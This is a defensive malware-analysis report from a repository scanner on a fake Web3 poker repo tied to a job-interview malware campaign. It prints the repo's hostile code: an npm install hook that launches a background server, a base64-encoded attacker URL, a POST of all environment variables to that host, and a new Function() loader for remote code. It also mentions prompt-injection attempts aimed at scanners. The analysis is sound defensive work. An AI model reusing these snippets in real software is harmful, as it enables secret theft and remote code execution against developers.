# clonesafe verdict — Contagious Interview sample 001

**Scanned:** 2026-04-08T20:00:00Z (retroactive; same-day reconstruction)
**Commit:** `HEAD` (default branch, as of 2026-04-08)
**Risk:** 🔴 **BLOCK**
**Score:** 433 / 100
**Verdict floor triggered:** YES (8 separate floor rules would lock BLOCK independently)

> **Note:** the specific org and repo name are redacted from this verdict because the attacker used brand impersonation against a legitimate Web3 project. See [`README.md`](README.md) for the rationale. The published IOCs below are attacker-controlled infrastructure, not brand identifiers.

## Summary

This repo is a **confirmed malicious sample** of the "Contagious Interview" campaign cluster. It disguises itself as a Web3 Texas Hold'em multiplayer poker game but contains (1) a malicious npm `prepare` lifecycle hook that silently launches a server on `npm install`, (2) a base64-encoded exfil endpoint in `routes/api/auth.js`, and (3) a `new Function()`-based stage-2 remote code execution loader that runs arbitrary JavaScript returned by the attacker's server.

**Do not clone this repo.** If you already cloned and ran `npm install`, go to [`../../playbooks/i-just-ran-it.md`](../../playbooks/i-just-ran-it.md) immediately.

## Critical findings

### LS-001 / LS-002 / LS-003 — `package.json:11`

```json
"prepare": "start /b node server || nohup node server &"
```

- **LS-001:** background process launch via `nohup`/`&` in a lifecycle hook (+40)
- **LS-002:** mixed Windows (`start /b`) and Unix (`nohup ... &`) syntax with `||` fallback (+40)
- **LS-003:** `node server` runs against the project entry file, not a build script (+40)

**Subtotal: +120.** Each rule independently triggers the verdict floor (CRITICAL lifecycle-script rules → BLOCK regardless of score).

### OB-003 — `routes/api/auth.js:28→42`

```js
const authKey = "aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==";
const AUTH_API = Buffer.from(authKey, "base64").toString();
// ... 12 lines later ...
new Function("require", data.code)(require);
```

48-character base64 literal decoded within 14 lines of a `new Function()` call. Canonical "download-decode-execute" stage-2 loader pattern.

**Weight: +50.** Triggers verdict floor.

### OB-004 — `routes/api/auth.js:42`

```js
new Function("require", data.code)(require);
```

Remote code execution: `data.code` traces back to line 36's HTTP fetch (`axios.post(AUTH_API, ...)`). The response body is passed as the body of a new anonymous function and immediately invoked with Node's real `require` injected.

**Weight: +50.** Triggers verdict floor.

### EX-001 — `routes/api/auth.js:36`

```js
const { data } = await axios.post(AUTH_API, { ...process.env });
```

Sends the entire `process.env` as the body of an HTTP POST to an external endpoint. `{ ...process.env }` spread captures every environment variable available to the Node process at runtime.

**Weight: +50.** Triggers verdict floor.

### EX-002 — `routes/api/auth.js:28-30`

```js
const authKey = "aHR0cHM6Ly9pcGNoZWNrLXNpeC52ZXJjZWwuYXBwL2FwaQ==";
const AUTH_API = Buffer.from(authKey, "base64").toString();
```

Base64 literal decoded at runtime and used directly as an HTTP exfiltration target. Decoded value: `https://ipcheck-six.vercel.app/api`. No legitimate reason to base64-encode an API URL in source code.

**Weight: +50.** Triggers verdict floor.

## IOC matches

- **`ipcheck-six.vercel.app`** in `iocs/domains.json` (IOC-2026-010) — known exfil endpoint for this campaign. **Weight: +40.** Triggers verdict floor (exact domain IOC hit).
- **Pattern `^[a-z]+-six\.vercel\.app$`** in `iocs/domains.json` (IOC-2026-PAT-001) — throwaway Vercel subdomain pattern used by multiple 2026 campaigns. **Weight: +20.**

**IOC subtotal: +60.**

## Strong warnings

- **RM-001:** repo `created_at` is 11 days before scan (new repo, <30d)  → +10
- **RM-002:** owner account `created_at` = repo creation date (new org, <30d)  → +15
- **RM-003:** contributors count = 1  → +8
- **RM-004:** `stargazers_count` = 0 (repo >7 days old, no engagement)  → +5
- **RM-005:** default branch has a single commit  → +5
- **RM-007:** no `.gitignore` despite having `package.json`  → +2

**Repo-metadata subtotal: +45.**

## Dependency caution

- **`axios: ^1.4.0`** — semver range `^1.4.0` allows any version from 1.4.0 up to (but not including) 2.0.0. This range **includes the yanked malicious version `axios@1.14.1`** that was live on npm for ~3 hours on March 31, 2026 (see [`../../iocs/packages.json`](../../iocs/packages.json) IOC-2026-001). Without a lockfile, clonesafe cannot verify which specific version this repo would install today. If the original incident happened during the compromise window, the victim could have received the malicious `plain-crypto-js`-dependent version.

**Weight: +8** (MEDIUM dependency-version caution).

## Prompt injection check

**✅ No PI-00X rules matched.** This sample does not attempt to manipulate the scanner directly — the attacker relied on technical exfil (`axios.post(process.env)` + `new Function(data.code)`) rather than social-engineering the scanner via README/comment injection.

This is a useful data point: **the sample represents an older-generation attack that predates the era of scanner-aware campaigns**. Future campaigns targeting clonesafe users may add PI attempts on top of the technical payload. clonesafe's PI detectors exist to catch that next generation.

If you're contributing a new sample to the clonesafe IOC database and it contains PI attempts, document them explicitly in your sample's README so defenders can study the full attack surface.

## Repo fingerprint

- **Owner:** [REDACTED] (new Organization, created ~11 days before scan)
- **Repo created:** ~11 days before scan
- **Last push:** 2 days before scan
- **Stars:** 0
- **Forks:** 0
- **Contributors:** 1
- **Commits on default branch:** 1
- **License:** none
- **Has .gitignore:** no
- **Archived:** no
- **Description:** [REDACTED for impersonation-safety] — free-text field; scanned for PI rules, zero matches

## Verdict floor application

This repo triggers the verdict floor at **multiple independent rules**, any one of which would lock the verdict at 🔴 BLOCK regardless of the final score:

1. LS-001 (background lifecycle-script launch) — CRITICAL lifecycle rule floor
2. LS-002 (mixed Win/Unix syntax) — CRITICAL lifecycle rule floor
3. LS-003 (node → non-build file in install hook) — CRITICAL lifecycle rule floor
4. OB-003 (base64 + dynamic exec) — CRITICAL obfuscation rule floor
5. OB-004 (RCE via new Function with variable body) — CRITICAL obfuscation rule floor
6. EX-001 (axios.post with process.env body) — CRITICAL exfil rule floor
7. EX-002 (decoded URL used as exfil endpoint) — CRITICAL exfil rule floor
8. IOC-2026-010 (exact domain IOC hit in `iocs/domains.json`) — exact-IOC-match floor

Additionally, the "2+ CRITICAL findings" floor fires — this sample has 7 distinct CRITICAL findings.

**Conclusion:** even if Phase B's reasoning were completely compromised by a hypothetical prompt injection, the mechanical Phase A findings plus the verdict floor would produce the correct BLOCK verdict. The defense works.

## Score breakdown

| Category | Weight |
|---|---|
| LS-001 (lifecycle background launch) | +40 |
| LS-002 (mixed Win/Unix syntax) | +40 |
| LS-003 (node → non-build file) | +40 |
| OB-003 (base64 + dynamic exec) | +50 |
| OB-004 (RCE via new Function) | +50 |
| EX-001 (env POST) | +50 |
| EX-002 (decoded exfil URL) | +50 |
| IOC-2026-010 (exact domain match) | +40 |
| IOC-2026-PAT-001 (pattern IOC) | +20 |
| Repo metadata (RM-001..007) | +45 |
| `axios: ^1.4.0` semver caution | +8 |
| PI-00X | 0 |
| **Total** | **433** |

## What you should do

- **Do not clone this repo.** Score is 433/100 — ~7x the BLOCK threshold.
- **Do not trust any communication from the recruiter who sent you this repo.** Block them across every channel.
- **Report this repo to GitHub Abuse** at https://github.com/contact/report-abuse (tag: malware).
- **Report the exfil domain** `ipcheck-six.vercel.app` to Vercel Abuse at https://vercel.com/abuse.
- **Share this sample** (the anonymized writeup, not the specific org name) with any other developers you know who might be interviewing in the same space — especially Web3, crypto, AI, DeFi roles.

If you've already run `npm install` on this or a similar repo:
- Stop reading. Go to [`../../playbooks/i-just-ran-it.md`](../../playbooks/i-just-ran-it.md) **now**.

## Full file inventory scanned

- `package.json` (root)
- `client/package.json`
- `README.md`
- `.gitignore` (absent)
- `server.js`
- `config/loadEnv.js`
- `routes/index.js`
- `routes/api/auth.js`  ← the main payload
- `middleware/index.js`

(Sample scan of top-level + known-suspicious paths. Deep scan would walk every `.js` file.)
